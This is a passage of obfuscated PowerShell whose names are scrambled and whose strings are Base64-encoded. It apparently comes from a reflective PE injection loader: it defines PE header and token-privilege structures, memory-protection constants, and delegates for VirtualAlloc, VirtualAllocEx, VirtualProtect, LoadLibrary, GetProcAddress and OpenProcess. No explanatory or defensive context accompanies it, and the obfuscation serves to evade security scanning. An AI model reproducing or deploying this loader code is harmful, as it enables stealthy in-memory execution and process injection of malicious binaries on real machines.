		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/=\_/=\/\/===\/\} = ${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${_/==\____/\____/=} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${__/\/=\/=\/\_/\__} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=\/====\/=\_/=\/}, ${_/==\____/\____/=}, ${/=\____/=\_/\/=\_}, @([Int32] 10))
		${_/=\_/=\/\/===\/\}.SetCustomAttribute(${__/\/=\/=\/\_/\__})
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\/\_/\_/=\/\/\_} = ${/===\/==\_/==\/\_}.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${_/\/\_/\_/=\/\/\_}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 40)
		${_/==\/==\_/\_/===} = ${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${_/==\____/\____/=} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${__/\/=\/=\/\_/\__} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=\/====\/=\_/=\/}, ${_/==\____/\____/=}, ${/=\____/=\_/\/=\_}, @([Int32] 8))
		${_/==\/==\_/\_/===}.SetCustomAttribute(${__/\/=\/=\/\_/\__})
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\/\/\/\/\__/\_/} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${_/\/\/\/\/\__/\_/}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 8)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\_/\_/=====\_/\} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${_/\_/\_/=====\_/\}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 20)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/=\_/=\/\__/==\} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${__/=\_/=\/\__/==\}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 40)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${___/\/=\/=\_/==\/} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${___/\/=\/=\_/==\/}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 8)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/==\___/\__/\/\/} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value ${_/==\___/\__/\/\/}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 12)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${_/==\___/\__/\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/=\/\/\/=\/\_/=} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${__/=\/\/\/=\/\_/=}
		${_/=\_/===\_/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${_/=\_/===\_/\/=\/}, [System.ValueType], 16)
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/===\/==\_/==\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${__/=\/\/\/=\/\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\___/\____/\___} = ${/===\/==\_/==\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${_/\___/\____/\___}
		return $Win32Types
	}
	Function ___/====\_/\/==\/\
	{
		$Win32Constants = New-Object System.Object
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return $Win32Constants
	}
	Function _/=\_/=\/\/\/=\/\/
	{
		$Win32Functions = New-Object System.Object
		${__/\_/\_____/=\__} = ___/\_/\/==\/\___/ kernel32.dll VirtualAlloc
		${___/\__/=\/\__/==} = __/====\_/\___/\_/ @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${______/\__/\/\___} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\_/\_____/=\__}, ${___/\__/=\/\__/==})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value ${______/\__/\/\___}
		${/====\___/\___/==} = ___/\_/\/==\/\___/ kernel32.dll VirtualAllocEx
		${__/==\___/=\/==\_} = __/====\_/\___/\_/ @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${_/===\/\_/\_/\/=\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/====\___/\___/==}, ${__/==\___/=\/==\_})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value ${_/===\/\_/\_/\/=\}
		${_/\___/=\/\/=\_/\} = ___/\_/\/==\/\___/ msvcrt.dll memcpy
		${/=\/==\/==\/\_/\_} = __/====\_/\___/\_/ @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${______/=\__/==\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\___/=\/\/=\_/\}, ${/=\/==\/==\/\_/\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value ${______/=\__/==\_/}
		${/=\_/\/==\_/\/==\} = ___/\_/\/==\/\___/ msvcrt.dll memset
		${__/\/\___/===\/\/} = __/====\_/\___/\_/ @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${__/\_/==\/\___/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\_/\/==\_/\/==\}, ${__/\/\___/===\/\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value ${__/\_/==\/\___/\/}
		${/===\/==\/\_/=\/\} = ___/\_/\/==\/\___/ kernel32.dll LoadLibraryA
		${/==\/\_/\/\__/\__} = __/====\_/\___/\_/ @([String]) ([IntPtr])
		${_/===\_/===\___/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/==\/\_/=\/\}, ${/==\/\_/\/\__/\__})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${_/===\_/===\___/\}
		${/=\__/=\_/==\_/\/} = ___/\_/\/==\/\___/ kernel32.dll GetProcAddress
		${/=\_/==\_/=====\_} = __/====\_/\___/\_/ @([IntPtr], [String]) ([IntPtr])
		${/=\___/=\_/\_/==\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\__/=\_/==\_/\/}, ${/=\_/==\_/=====\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${/=\___/=\_/\_/==\}
		${_/=====\/\_/==\/=} = ___/\_/\/==\/\___/ kernel32.dll GetProcAddress
		${__/\/==\___/\__/\} = __/====\_/\___/\_/ @([IntPtr], [IntPtr]) ([IntPtr])
		${_/===\__/\/=\_/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=====\/\_/==\/=}, ${__/\/==\___/\__/\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value ${_/===\__/\/=\_/\_}
		${/===\_/\_/\/\____} = ___/\_/\/==\/\___/ kernel32.dll VirtualFree
		${/===\/=\_/\/\/\__} = __/====\_/\___/\_/ @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${___/\/=\_/\_/==\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\_/\_/\/\____}, ${/===\/=\_/\/\/\__})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value ${___/\/=\_/\_/==\/}
		${_/\____/=\__/\___} = ___/\_/\/==\/\___/ kernel32.dll VirtualFreeEx
		${_/\/=\_/===\/===\} = __/====\_/\___/\_/ @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${____/=\/\/=\__/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\____/=\__/\___}, ${_/\/=\_/===\/===\})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value ${____/=\/\/=\__/\_}
		${_/=====\/\/\_/\/\} = ___/\_/\/==\/\___/ kernel32.dll VirtualProtect
		${__/\___/\/=\_/===} = __/====\_/\___/\_/ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${__/=\/=\/=\/=====} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=====\/\/\_/\/\}, ${__/\___/\/=\_/===})
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value ${__/=\/=\/=\/=====}
		${/=\___/=====\__/\} = ___/\_/\/==\/\___/ kernel32.dll GetModuleHandleA
		${__/\/\___/==\_/\_} = __/====\_/\___/\_/ @([String]) ([IntPtr])
		${_/==\/\__/=\___/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\___/=====\__/\}, ${__/\/\___/==\_/\_})
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value ${_/==\/\__/=\___/\}
		${_/\__/\_/=\___/=\} = ___/\_/\/==\/\___/ kernel32.dll FreeLibrary
		${/=\/\/====\/=\___} = __/====\_/\___/\_/ @([IntPtr]) ([Bool])
		${_/\/=\/=\/=\_____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\__/\_/=\___/=\}, ${/=\/\/====\/=\___})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${_/\/=\/=\/=\_____}
		${_/\/=\_______/\/=} = ___/\_/\/==\/\___/ kernel32.dll OpenProcess
	    ${__/=\_/\_/\_/\/\_} = __/====\_/\___/\_/ @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${/=\_/=\/=\/===\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/=\_______/\/=}, ${__/=\_/\_/\_/\/\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${/=\_/=\/=\/===\_/}
		${__/=\/=\/\__/==\_} = ___/\_/\/==\/\___/ kernel32.dll WaitForSingleObject
	    ${/=\/===\/==\__/\/} = __/====\_/\___/\_/ @([IntPtr], [UInt32]) ([UInt32])
	    ${/=\_/\/===\______} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/=\/\__/==\_}, ${/=\/===\/==\__/\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${/=\_/\/===\______}
